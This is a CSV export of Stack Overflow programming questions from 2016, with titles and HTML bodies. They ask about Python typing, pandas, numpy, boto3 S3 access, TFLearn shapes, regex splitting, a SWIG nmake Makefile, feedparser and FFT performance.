Id,OwnerUserId,CreationDate,Score,Title,Body
39817081,2505645.0,2016-10-02 12:38:34+00:00,4,typing.Any vs object?,"<p>Is there any difference between using <code>typing.Any</code> as opposed to <code>object</code> in typing? For example:</p>

<pre><code>def get_item(L: list, i: int) -&gt; typing.Any:
    return L[i]
</code></pre>

<p>Compared to:</p>

<pre><code>def get_item(L: list, i: int) -&gt; object:
    return L[i]
</code></pre>
"
39976348,2844655.0,2016-10-11 11:34:07+00:00,4,Pandas Slow. Want first occurrence in DataFrame,"<p>I have a DataFrame of <code>people</code>. One of the columns in this DataFrame is a <code>place_id</code>. I also have a DataFrame of places, where one of the columns is <code>place_id</code> and another is <code>weather</code>. For every person, I am trying to find the corresponding weather. Importantly, many people have the same <code>place_id</code>s. </p>

<p>Currently, my setup is this:</p>

<pre><code>def place_id_to_weather(pid):
    return place_df[place_df['place_id'] == pid]['weather'].item() 

person_df['weather'] = person_df['place_id'].map(place_id_to_weather)`
</code></pre>

<p>But this is untenably slow. I would like to speed this up. I suspect that I could achieve a speedup like this:</p>

<p>Instead of returning <code>place_df[...].item()</code>, which does a search for <code>place_id == pid</code> for that entire column and returns a series, and then grabbing the first item in that series, I really just want to curtail the search in <code>place_df</code> after the first match <code>place_df['place_id']==pid</code> has been found. After that, I don't need to search any further. How do I limit the search to first occurrences only?</p>

<p>Are there other methods I could use to achieve a speedup here? Some kind of join-type method?</p>
"
39963745,,2016-10-10 17:34:09+00:00,4,Download files from public S3 bucket with boto3,"<p>I cannot download a file or even get a listing of the <strong>public</strong> S3 bucket with <code>boto3</code>.</p>

<p>The code below works with my own bucket, but not with public one:</p>

<pre><code>def s3_list(bucket, s3path_or_prefix):
    bsession = boto3.Session(aws_access_key_id=settings.AWS['ACCESS_KEY'],
                             aws_secret_access_key=settings.AWS['SECRET_ACCESS_KEY'],
                             region_name=settings.AWS['REGION_NAME'])
    s3 = bsession.resource('s3')
    my_bucket = s3.Bucket(bucket)
    items = my_bucket.objects.filter(Prefix=s3path_or_prefix)
    return [ii.key for ii in items]
</code></pre>

<p>I get an <code>AccessDenied</code> error on this code. The bucket is not in my own and I cannot set permissions there, but I am sure it is open to public read.</p>
"
40064422,1236057.0,2016-10-15 21:30:02+00:00,4,Issues with shaping Tensorflow/TFLearn inputs/outputs for images,"<p>To learn more about deep learning and computer vision, I'm working on a project to perform lane-detection on roads. I'm using TFLearn as a wrapper around Tensorflow.</p>

<p><strong>Background</strong></p>

<p>The training inputs are images of roads (each image represented as a 50x50 pixel 2D array, with each element being a luminance value from 0.0 to 1.0).</p>

<p>The training outputs are the same shape (50x50 array), but represent the marked lane area. Essentially, non-road pixels are 0, and road pixels are 1.</p>

<p>This is not a fixed-size image classification problem, but instead a problem of detecting road vs. non-road pixels from a picture.</p>

<p><strong>Problem</strong></p>

<p>I've not been able to successfully shape my inputs/outputs in a way that TFLearn/Tensorflow accepts, and I'm not sure why. Here is my sample code:</p>

<pre><code># X = An array of training inputs (of shape (50 x 50)).
# Y = An array of training outputs (of shape (50 x 50)).

# ""None"" equals the number of samples in my training set, 50 represents
# the size of the 2D image array, and 1 represents the single channel
# (grayscale) of the image.
network = input_data(shape=[None, 50, 50, 1])

network = conv_2d(network, 50, 50, activation='relu')

# Does the 50 argument represent the output shape? Should this be 2500?
network = fully_connected(network, 50, activation='softmax')

network = regression(network, optimizer='adam', loss='categorical_crossentropy', learning_rate=0.001)

model = tflearn.DNN(network, tensorboard_verbose=1)

model.fit(X, Y, n_epoch=10, shuffle=True, validation_set=(X, Y), show_metric=True, batch_size=1)
</code></pre>

<p>The error I receive is on the <code>model.fit</code> call, with error:</p>

<p><code>ValueError: Cannot feed value of shape (1, 50, 50) for Tensor u'InputData/X:0', which has shape '(?, 50, 50, 1)'</code></p>

<p>I've tried reducing the sample input/output arrays to a 1D vector (with length 2500), but that leads to other errors.</p>

<p>I'm a bit lost with how to shape all this, any help would be greatly appreciated!</p>
"
39602824,1479974.0,2016-09-20 20:00:39+00:00,4,pandas: replace string with another string,"<p>I have the following data frame</p>

<pre><code>    prod_type
0   responsive
1   responsive
2   respon
3   r
4   respon
5   r
6   responsive
</code></pre>

<p>I would like to replace <code>respon</code> and <code>r</code> with <code>responsive</code>, so the final data frame is</p>

<pre><code>    prod_type
0   responsive
1   responsive
2   responsive
3   responsive
4   responsive
5   responsive
6   responsive
</code></pre>

<p>I tried the following but it did not work:</p>

<pre><code>df['prod_type'] = df['prod_type'].replace({'respon' : 'responsvie'}, regex=True)
df['prod_type'] = df['prod_type'].replace({'r' : 'responsive'}, regex=True)
</code></pre>
"
39602785,6263724.0,2016-09-20 19:58:04+00:00,4,Complex time operations in Pandas,"<p>Below is a small sample of my very large dataframe:</p>

<pre><code>In [38]: df
Out[38]:
          Send_Customer         Pay_Customer           Send_Time
 0       1000000000284044644  1000000000251680999 2016-08-01 09:55:48
 1       2000000000223021617  1000000000190078650 2016-08-01 02:44:23
 2       2000000000289301033  1000000000309048473 2016-08-01 09:20:14
 3       1000000000333893941  1000000000333956151 2016-08-01 09:20:14
 4       1000000000340371553  2000000000103942022 2016-08-01 09:20:14
 5       2000000000098132192  2000000000089264458 2016-08-01 09:21:27
 6       1000000000007716594  2000000000144437513 2016-08-01 09:20:54
 7       1000000000135884145  1000000000278399847 2016-08-01 09:21:43
 8       2000000000141318366  2000000000151080468 2016-08-01 09:20:46
 9       1000000000056842546  2000000000139908360 2016-08-01 09:20:55
10       1000000000275051425  2000000000254558241 2016-08-01 09:20:17
11       1000000000162362467  1000000000340653197 2016-08-01 09:23:45
12       1000000000039529533  1000000000072903285 2016-08-01 09:22:56
13       1000000000034147075  2000000000079408765 2016-08-01 09:20:17
14       1000000000319501203  1000000000337830072 2016-08-01 09:20:20
15       1000000000025289495  2000000000287368163 2016-08-01 09:20:31
16       1000000000043110429  1000000000209850047 2016-08-01 09:22:33
</code></pre>

<p>I need to find out, in a timespan of 10 hours, how many non-unique or unique <code>Pay_Customers</code> a <code>Send_Customer</code> has?</p>

<p>So, here is the approach I am using:</p>

<pre><code>In [39]: df['time_diff'] = df.groupby('Send_Customer')['Send_Time'].apply(lambda x : x.diff().abs())

In [41]: df[df['time_diff']&lt;=dt.timedelta(seconds=36000)]
Out[41]:

Send_Customer         Pay_Customer           Send_Time         \       

4361    1000000000284044644  1000000000326834813 2016-08-01 14:32:17
7530    2000000000223021617  1000000000340199555 2016-08-01 04:49:41
10937   2000000000148219588  1000000000312697109 2016-08-01 04:49:40
12876   1000000000339947901  2000000000218218239 2016-08-01 14:51:51
13553   1000000000248905073  1000000000248729812 2016-08-01 16:44:35
14281   2000000000270573223  1000000000341120021 2016-08-01 09:35:11

        time_diff
4361     00:10:37
7530     00:17:06
10937    01:09:45
12876    00:53:59
13553    01:12:17
14281    05:19:34
</code></pre>

<p>This approach works partially as using <code>.diff()</code> on <code>['Send_Time']</code> eliminates the first row that was used to take the difference. Any thoughts on how to preserve such rows?</p>
"
40059890,,2016-10-15 13:55:06+00:00,4,Import settings from the file,"<p>I would like to import settings from a yaml file, but make them available as regular variables in the current context.</p>

<p>for example I may have a file:</p>

<pre><code>param1: 12345

param2: test11

param3:
    a: 4
    b: 7
    c: 9
</code></pre>

<p>And I would like to have variables <code>param1</code>, <code>param2</code>, <code>param3</code> in my code.</p>

<p>I may want to use this from any function and do not want to have them available globally.</p>

<p>I have heard about <code>locals()</code> and <code>globals()</code> functuons, but did not get how to use them for this.</p>
"
39691091,4591810.0,2016-09-25 19:43:22+00:00,4,How to split up a string on multiple delimiters but only capture some?,"<p>I want to split a string on any combination of delimiters I provide. For example, if the string is:  </p>

<pre><code>s = 'This, I think,., Ú©Ø¨Ø§Ø¨ MAKES , some sense '
</code></pre>

<p>And the delimiters are <code>\.</code>, <code>,</code>, and <code>\s</code>. However I want to capture all delimiters except whitespace <code>\s</code>. The output should be:  </p>

<pre><code>['This', ',', 'I', 'think', ',.,', 'Ú©Ø¨Ø§Ø¨', 'MAKES', ',', 'some', 'sense']
</code></pre>

<p>My solution so far is is using the <code>re</code> module:  </p>

<pre><code>pattern = '([\.,\s]+)'  
re.split(pattern, s)
</code></pre>

<p>However, this captures whitespace as well. I have tried using other patterns like <code>[(\.)(,)\s]+</code> but they don't work.</p>

<p><em>Edit</em>: @PadraicCunningham made an astute observation. For delimiters like <code>Some text ,. , some more text</code>, I'd only want to remove leading and trailing whitespace from <code>,. ,</code> and not whitespace within.</p>
"
39973360,6824986.0,2016-10-11 08:36:43+00:00,4,How to pass a list of lists through a for loop in Python?,"<p>I have a list of lists :</p>

<pre><code>sample = [['TTTT', 'CCCZ'], ['ATTA', 'CZZC']]
count = [[4,3],[4,2]]
correctionfactor  = [[1.33, 1.5],[1.33,2]]
</code></pre>

<p>I calculate frequency of each character (pi), square it and then sum (and then I calculate het = 1 - sum). </p>

<pre><code>The desired output [[1,2],[1,2]] #NOTE: This is NOT the real values of expected output. I just need the real values to be in this format. 
</code></pre>

<p>The problem: I do not how to pass the list of lists(sample, count) in this loop to extract the values needed. I previously passed only a list (eg <code>['TACT','TTTT'..]</code>) using this code. </p>

<ul>
<li>I suspect that I need to add a larger for loop, that indexes over each element in sample (i.e. indexes over <code>sample[0] = ['TTTT', 'CCCZ']</code> and <code>sample[1] = ['ATTA', 'CZZC']</code>. I am not sure how to incorporate that into the code.</li>
</ul>

<p>**
Code</p>

<pre><code>list_of_hets = []
for idx, element in enumerate(sample):
    count_dict = {}
    square_dict = {}
    for base in list(element):
         if base in count_dict:
            count_dict[base] += 1
        else:
            count_dict[base] = 1
    for allele in count_dict: #Calculate frequency of every character
        square_freq = (count_dict[allele] / count[idx])**2 #Square the frequencies
        square_dict[allele] = square_freq        
    pf = 0.0
    for i in square_dict:
        pf += square_dict[i]   # pf --&gt; pi^2 + pj^2...pn^2 #Sum the frequencies
    het = 1-pf                    
    list_of_hets.append(het)
print list_of_hets

""Failed"" OUTPUT:
line 70, in &lt;module&gt;
square_freq = (count_dict[allele] / count[idx])**2
TypeError: unsupported operand type(s) for /: 'int' and 'list'er
</code></pre>
"
40132352,4948165.0,2016-10-19 13:10:04+00:00,4,python filter 2d array by a chunk of data,"<pre><code>import numpy as np

data = np.array([
    [20,  0,  5,  1],
    [20,  0,  5,  1],
    [20,  0,  5,  0],
    [20,  1,  5,  0],
    [20,  1,  5,  0],
    [20,  2,  5,  1],
    [20,  3,  5,  0],
    [20,  3,  5,  0],
    [20,  3,  5,  1],
    [20,  4,  5,  0],
    [20,  4,  5,  0],
    [20,  4,  5,  0]
])
</code></pre>

<p>I have the following 2d array. lets called the fields <code>a, b, c, d</code> in the above order where column <code>b</code> is like <code>id</code>. I wish to delete all cells that doesnt have atlist 1 appearance of the number ""1"" in column <code>d</code> for all cells with the same number in column <code>b</code> (same id) so after filtering i will have the following results:</p>

<pre><code>[[20  0  5  1]
 [20  0  5  1]
 [20  0  5  0]
 [20  2  5  1]
 [20  3  5  0]
 [20  3  5  0]
 [20  3  5  1]]
</code></pre>

<p>all rows with <code>b = 1</code> and <code>b = 4</code> have been deleted from the data</p>

<p>to sum up because I see answers that doesnt fit. we look at chunks of data by the <code>b</code> column. if a complete chunk of data doesnt have even one appearance of the number ""1"" in column <code>d</code> we delete all the rows of that <code>b</code> item. in the following example we can see a chunk of data with <code>b = 1</code> and <code>b = 4</code> (""id"" = 1 and ""id"" = 4) that have 0 appearances of the number ""1"" in column <code>d</code>. thats why it gets deleted from the data </p>
"
39696818,5527679.0,2016-09-26 07:16:31+00:00,4,Which one is good practice about python formatted string?,"<p>Suppose I have a file on <code>/home/ashraful/test.txt</code>. Simply I just want to open the file. 
Now my question is:</p>

<p>which one is good practice?</p>

<p><strong>Solution 1:</strong> </p>

<pre><code>dir = ""/home/ashraful/""
fp = open(""{0}{1}"".format(dir, 'test.txt'), 'r')
</code></pre>

<p><strong>Solution 2:</strong> </p>

<pre><code>dir = ""/home/ashraful/""
fp = open(dir + 'test.txt', 'r')
</code></pre>

<p>The both way I can open file. </p>

<p>Thanks :) </p>
"
39821166,6820197.0,2016-10-02 20:06:54+00:00,4,How to reverse the elements in a sublist?,"<p>I'm trying to create a function that reverses the order of the elements in a list, and also reverses the elements in a sublist. for example:</p>

<p>For example, if L = [[1, 2], [3, 4], [5, 6, 7]] then deep_reverse(L) mutates L to be [[7, 6, 5], [4, 3], [2, 1]]</p>

<p>I figured out how to reverse the order of one list, but I am having troubles with reversing the order of elements in a sublist. This is what I have so far:</p>

<pre><code>def deep_reverse(L)
    """""" 
    assumes L is a list of lists whose elements are ints
    Mutates L such that it reverses its elements and also 
    reverses the order of the int elements in every element of L. 
    It does not return anything.
    """"""
    for i in reversed(L):
          print(i)
</code></pre>

<p>In the example above, my code would just print <code>[5,6,7], [3,4], [1,2]</code>, which is not what i'm trying to accomplish. It's just reversing the order of the lists, the not actual elements in the lists.</p>

<p>What should I add to the code so that it also reverses the order of the elements in a sublist?</p>

<p>[<strong>EDIT</strong>: my code <strong>needs</strong> to mutate the list; I don't want it just to print it, it actually needs to change the list.]</p>
"
40063242,6912717.0,2016-10-15 19:18:49+00:00,4,Python dataframe sum rows,"<p>If I have a dataframe with <code>n</code> rows, is there a way to set the ith row to be sum of <code>row[i]</code> and <code>row[i-1]</code> and do this so that the assignment to earlier rows is reflected in the latter rows? I would really like to avoid loops if possible.</p>

<p>Example DF:</p>

<pre><code>             SPY   AAPL   GOOG
2011-01-10  0.44  -0.81   1.80
2011-01-11  0.00   0.00   0.00
2011-01-12 -1.11  -2.77  -0.86
2011-01-13 -0.91  -4.02  -0.68
</code></pre>

<p>Sample pseudo code of summing two rows:</p>

<pre><code>DF[2011-01-11] = DF[2011-01-10] + DF[2011-01-11]
DF[2011-01-12] = DF[2011-01-11] + DF[2011-01-12]
</code></pre>

<p>and so on.</p>
"
40063034,5248253.0,2016-10-15 18:59:57+00:00,4,Fill a multidimensional array efficiently that have many if else statements,"<p>I want to fill an 4dim numpy array in a specific and efficient way. Because I don't know better I startet to write the code with if else statements, but that doesn't look nice, is probably slow and I also can not be really sure if I thought about every combination. Here is the code which I stopped writing down:</p>

<pre><code>sercnew2 = numpy.zeros((gn, gn, gn, gn))
for x1 in range(gn):
    for x2 in range(gn):
        for x3 in range(gn):
            for x4 in range(gn):
                if x1 == x2 == x3 == x4: 
                    sercnew2[x1, x2, x3, x4] = ewp[x1]
                elif x1 == x2 == x3 != x4:
                    sercnew2[x1, x2, x3, x4] = ewp[x1] * ewp[x4]
                elif x1 == x2 == x4 != x3:
                    sercnew2[x1, x2, x3, x4] = ewp[x1] * ewp[x3]
                elif x1 == x3 == x4 != x2:
                    sercnew2[x1, x2, x3, x4] = ewp[x1] * ewp[x2]
                elif x2 == x3 == x4 != x1:
                    sercnew2[x1, x2, x3, x4] = ewp[x2] * ewp[x1]
                elif x1 == x2 != x3 == x4:
                    sercnew2[x1, x2, x3, x4] = ewp[x1] * ewp[x3]
                elif ... many more combinations which have to be considered
</code></pre>

<p>So basically what should happen is, that if all variables (x1, x2, x3, x4) are different from each other, the entry would be: </p>

<pre><code>sercnew2[x1, x2, x3, x4] = ewp[x1]* ewp[x2] * ewp[x3] * ewp[x4]
</code></pre>

<p>Now if lets say the variable x2 and x4 is the same then:</p>

<pre><code>sercnew2[x1, x2, x3, x4] = ewp[x1]* ewp[x2] * ewp[x3]
</code></pre>

<p>Others examples can be seen in the code above. Basically if two or more variables are the same, then I only consider on of them. I hope the pattern is clear. Otherwise please let me note and I will try to express my problem better. I am pretty sure, that there is a much more intelligent way to do it. Hope you know better and thanks in advance :)   </p>
"
39830598,3809375.0,2016-10-03 11:32:23+00:00,4,How to rebuild project after SWIG files changed?,"<p>Given the below makefile:</p>

<pre><code>TARGET = _example.pyd
OFILES = example.obj example_wrap.obj
HFILES =

CC = cl
CXX = cl
LINK = link
CPPFLAGS = -DNDEBUG -DUNICODE -DWIN32 -I. -Id:\virtual_envs\py351\include
CFLAGS = -nologo -Zm200 -Zc:wchar_t- -FS -Zc:strictStrings -O2 -MD -W3 -w44456 -w44457 -w44458
CXXFLAGS = -nologo -Zm200 -Zc:wchar_t- -FS -Zc:strictStrings -D_HAS_EXCEPTIONS=0 -O2 -MD -W3 -w34100 -w34189 -w44996 -w44456 -w44457 -w44458 -wd4577
LFLAGS = /LIBPATH:. /NOLOGO /DYNAMICBASE /NXCOMPAT /DLL /MANIFEST /MANIFESTFILE:$(TARGET).manifest /SUBSYSTEM:WINDOWS /INCREMENTAL:NO
LIBS = /LIBPATH:d:\virtual_envs\py351\libs python35.lib
.SUFFIXES: .c .cpp .cc .cxx .C


{.}.cpp{}.obj::
    $(CXX) -c $(CXXFLAGS) $(CPPFLAGS) -Fo @&lt;&lt;
    $&lt;
&lt;&lt;

{.}.cc{}.obj::
    $(CXX) -c $(CXXFLAGS) $(CPPFLAGS) -Fo @&lt;&lt;
    $&lt;
&lt;&lt;

{.}.cxx{}.obj::
    $(CXX) -c $(CXXFLAGS) $(CPPFLAGS) -Fo @&lt;&lt;
    $&lt;
&lt;&lt;

{.}.C{}.obj::
    $(CXX) -c $(CXXFLAGS) $(CPPFLAGS) -Fo @&lt;&lt;
    $&lt;
&lt;&lt;

{.}.c{}.obj::
    $(CC) -c $(CFLAGS) $(CPPFLAGS) -Fo @&lt;&lt;
    $&lt;
&lt;&lt;

all: $(TARGET)

$(OFILES): $(HFILES)

$(TARGET): $(OFILES)
    $(LINK) $(LFLAGS) /OUT:$(TARGET) @&lt;&lt;
      $(OFILES) $(LIBS)
&lt;&lt;
    mt -nologo -manifest $(TARGET).manifest -outputresource:$(TARGET);2

install: $(TARGET)
    @if not exist d:\virtual_envs\py351\Lib\site-packages mkdir d:\virtual_envs\py351\Lib\site-packages
    copy /y $(TARGET) d:\virtual_envs\py351\Lib\site-packages\$(TARGET)

clean:
    -del $(TARGET)
    -del *.obj
    -del *.exp
    -del *.lib
    -del $(TARGET).manifest

test:
    python runme.py
</code></pre>

<p>I'd like to improve a couple of things here:</p>

<ul>
<li>I'd like to consider swig files (*.i) in the makefile. For example, every time some swig file has been changed a new wrap file should be generated (ie: swig -python -c++ file_has_changed.cpp) and then rebuild the project</li>
<li>I'd like to avoid having hardcoded object files. For instance, I'd like to use all cpp files using wildcards somehow</li>
</ul>

<p>I've read a little bit of the docs talking about <a href=""https://msdn.microsoft.com/en-us/library/yz1tske6.aspx"" rel=""nofollow"">Makefiles</a> but I'm still pretty much confused. How could I achieve this?</p>

<p>Right now I'm using a <strong>hacky</strong> solution like <code>swig -python -c++ whatever_file.i &amp;&amp; nmake</code>, that's of course it's not ideal at all</p>

<p>REFERENCES</p>

<p>Achieving this inside visual studio IDE is quite easy following <a href=""http://stackoverflow.com/questions/5969173/how-to-swig-in-vs2010/6117641#6117641"">these steps</a> but I'd like to use this makefile inside SublimeText, that's why I'm quite interested on knowing how to have a proper Makefile</p>
"
39967037,5086903.0,2016-10-10 21:29:35+00:00,4,I'm getting an List index out of range error for an index that exist,"<p>Im using feed parser to obtain rss objects. When I run </p>

<pre><code>live_leak.links
</code></pre>

<p>I get</p>

<pre><code>[{'type': 'text/html', 'rel': 'alternate', 'href': 
'http://www.liveleak.com/view?i=abf_1476121939'}, 

{'type': 'application/x-shockwave-flash', 'rel': 'enclosure', 'href':
 'http://www.liveleak.com/e/abf_1476121939'}]
</code></pre>

<p>But when i try this</p>

<pre><code>live_leak.links[1]
</code></pre>

<p>I get list index out of range, mind you this was working earlier then all of a sudden this didn't work. I had this in my code and it took me hours to find because I didn't realize it was this that wasn't working. If no one knows I'll do a string replace as a hack but I rather do what was already working.</p>

<p>this also works </p>

<pre><code>live_leak[0]
</code></pre>

<p>it returns</p>

<pre><code>[{'type': 'text/html', 'rel': 'alternate', 'href': 
'http://www.liveleak.com/view?i=abf_1476121939'}]
</code></pre>

<p>which is weird because the other one won't work</p>

<h1>EDIT</h1>

<pre><code>def pan_task():
        url = 'http://www.liveleak.com/rss?featured=1'
        name = 'live leak'
        live_leaks = [i for i in feedparser.parse(url).entries]
        the_count = len(live_leaks)
        ky = feedparser.parse(url).keys()
        oky = [i.keys() for i in feedparser.parse(url).entries][:12] # shows what I can pull

        try:
            live_entries = [{
                             'html': live_leak.links,
                             'href': live_leak.links[0]['href'],
                             'src': live_leak.media_thumbnail[0]['url'],
                             'text': live_leak.title,
                             'comments': live_leak.description,
                             'url': live_leak.links[0]['href'],
                             'embed': live_leak.links[1]['href'],
                             'text': live_leak.title,
                             'comments': live_leak.description,
                             'name': name,
                             'url': live_leak.link, # this is the link to the source
                             'author': None,
                             'video': False
                             } for live_leak in live_leaks]
        except IndexError:
            print('error check logs')
            live_entries = []

        # for count, elem in enumerate(live_entries):
        #     the_html = requests.get(live_entries[count]['url']) # a specific text

        return print(live_entries[0])
</code></pre>
"
39634577,4533188.0,2016-09-22 08:59:23+00:00,4,"Are methods instanciated with classes, consuming lots of memory (in Scala)?","<h2>Situation</h2>

<p>I am going to build a program (in Scala or Python - not yet decided) that is intensive on data manipulation. I see two mayor approaches:</p>

<ol>
<li><strong>Approach:</strong> Define a collection of the data. Write my function. Send the entire dataset through the function.</li>
<li><strong>Approach:</strong> Define a data class that represents a single data entity and code the method (class member) into the data class. Parts of the method that should be flexible are send to the method via Scala Function or Python lambda.</li>
</ol>

<h2>Side question</h2>

<p>I am not sure but the first approach might be more functional programming like, the second more OOP, is that right? By the way, I love both Functional Programming and OOP (some say they are opposites of each other, but Odersky tried his best to disprove that with Scala).</p>

<h2>Main question</h2>

<p>I prefer the second approach, because</p>

<ol>
<li>It seems more concise to me.</li>
<li>It makes it easier to distribute the program in a shared-nothing architecture Big Data setting, since it brings functionality to the data and not data to functionality following the principle of data locality.</li>
</ol>

<p>However, <em>I worry that if I have a lot of data (and I do), I will have a lot of memory consumption because the method might have to be instantiated so many times.</em></p>

<ol>
<li><strong>Question:</strong> Is that true for Scala/JVM - if not, how is it solved?</li>
<li><strong>Question:</strong> Is that true for Python - if not, how is it solved?</li>
</ol>

<h2>Follow-up question</h2>

<p>Leading me up to: Which approach should I choose?</p>

<h2>More Context</h2>

<ul>
<li>I have lot of data (millions, potentially billions of data objects)</li>
<li>I have not that many functions to implement. To give a ballpark figure, let's say about 10.</li>
<li>I expect a lot of calls to the methods though.</li>
<li>Let's say I have 100 calls per data entity, then I would have 100 * 1 million calls for the entire program.</li>
<li>My data class represents a single entity, not the entire dataset. </li>
<li>My worry is that with each instantiation of my DataObject class, the code of the method needs to be duplicated, which would cost a lot of memory and processing power. I have no idea how the internals of the JVM and Python work in this regard and whether that is true - that is what I am asking.</li>
</ul>

<p>Here a crude DataObject class:</p>

<pre><code>class DataObject {

    List datavalues

    def mymethod(){
        ...
    }
}
</code></pre>
"
39644202,5690982.0,2016-09-22 16:23:41+00:00,4,Assigning empty list,"<p>I don't really know how I stumbled upon this, and I don't know what to think about it, but apparently <code>[] = []</code> is a legal operation in python, so is <code>[] = ''</code>, but <code>'' = []</code> is not allowed. It doesn't seem to have any effect though, but I'm wondering: what the hell ? </p>
"
40061307,5269892.0,2016-10-15 16:08:54+00:00,4,Comparatively slow python numpy 3D Fourier Transformation,"<p>Dear StackOverflow community!</p>

<p>For my work I need to perform discrete fourier transformations (DFTs) on large images. In the current example I require a 3D FT for a 1921 x 512 x 512 image (along with 2D FFTs of 512 x 512 images). Right now, I am using the numpy package and the associated function <a href=""http://docs.scipy.org/doc/numpy/reference/generated/numpy.fft.fftn.html"" rel=""nofollow"">np.fft.fftn()</a>. The code snippet below exemplarily shows 2D and 3D FFT times on an equal-sized/slightly smaller 2D/3D random-number-generated grid in the following way:</p>

<pre><code>import sys
import numpy as np
import time

tas = time.time()
a = np.random.rand(512, 512)
tab = time.time()
b = np.random.rand(100, 512, 512)

tbfa = time.time()

fa = np.fft.fft2(a)
tfafb = time.time()
fb = np.fft.fftn(b)
tfbe = time.time()

print ""initializing 512 x 512 grid:"", tab - tas
print ""initializing 100 x 512 x 512 grid:"", tbfa - tab
print ""2D FFT on 512 x 512 grid:"", tfafb - tbfa
print ""3D FFT on 100 x 512 x 512 grid:"", tfbe - tfafb
</code></pre>

<p>Output:</p>

<pre><code>initializing 512 x 512 grid: 0.00305700302124
initializing 100 x 512 x 512 grid: 0.301637887955
2D FFT on 512 x 512 grid: 0.0122730731964
3D FFT on 100 x 512 x 512 grid: 3.88418793678
</code></pre>

<p>The problem that I have is that I will need this process quite often, so the time spent per image should be short. When testing on my own computer (middle-segment laptop, 2GB RAM allocated to virtual machine (--> therefore smaller test grid)), as you can see the 3D FFT takes ~ 5 s (order-of-magnitude). Now, at work, the machines are way better, cluster/grid-architecture systems and FFTs are much faster. In both cases the 2D ones finish quasi instantaneously.</p>

<p>However with 1921x512x512, <a href=""http://docs.scipy.org/doc/numpy/reference/generated/numpy.fft.fftn.html"" rel=""nofollow"">np.fft.fftn()</a> takes ~ 5 min. Since I guess scipy's implementation is not much faster and considering that on MATLAB FFTs of same-sized grids finish within ~ 5 s, my question is whether there is a method to speed the process up to or almost to MATLAB times. My knowledge about FFTs is limited, but apparently MATLAB uses the FFTW algorithm, which python does not. Any reasonable chance that with some pyFFTW package I get similar times? Also, 1921 seems an unlucky choice, having only 2 prime factors (17, 113), so I assume this also plays a role. On the other hand 512 is a well-suited power of two. Are MATLAB-like times achievable if possible also without padding up with zeros to 2048?</p>

<p>I'm asking because I'll have to use FFTs a lot (to an amount where such differences will be of huge influence!) and in case there is no possibility to reduce computation times in python, I'd have to switch to other, faster implementations.</p>

<p>Any advice is greatly appreciated!</p>
"
39836953,823743.0,2016-10-03 17:16:08+00:00,4,How to draw a precision-recall curve with interpolation in python?,"<p>I have drawn a precision-recall curve using <code>sklearn</code> <code>precision_recall_curve</code>function and <code>matplotlib</code> package. For those of you who are familiar with precision-recall curve you know that some scientific communities only accept it when its interpolated, similar to this example <a href=""http://nlp.stanford.edu/IR-book/html/htmledition/evaluation-of-ranked-retrieval-results-1.html"" rel=""nofollow"">here</a>. Now my question is if any of you know how to do the interpolation in python? I have been searching for a solution for a while now but with no success! Any help would be greatly appreciated. </p>

<p><strong>Solution:</strong> Both solutions by @francis and @ali_m are correct and together solved my problem. So, assuming that you get an output from the <code>precision_recall_curve</code> function in <code>sklearn</code>, here is what I did to plot the graph:</p>

<pre><code>        precision[""micro""], recall[""micro""], _ = precision_recall_curve(y_test.ravel(),scores.ravel())
        pr = copy.deepcopy(precision[0])
        rec = copy.deepcopy(recall[0])
        prInv = np.fliplr([pr])[0]
        recInv = np.fliplr([rec])[0]
        j = rec.shape[0]-2
        while j&gt;=0:
            if prInv[j+1]&gt;prInv[j]:
                prInv[j]=prInv[j+1]
            j=j-1
        decreasing_max_precision = np.maximum.accumulate(prInv[::-1])[::-1]
        plt.plot(recInv, decreasing_max_precision, marker= markers[mcounter], label=methodNames[countOfMethods]+': AUC={0:0.2f}'.format(average_precision[0]))
</code></pre>

<p>And these lines will plot the interpolated curves if you put them in a for loop and pass it the data of each method at each iteration. Note that this will not plot the non-interpolated precision-recall curves.</p>
"
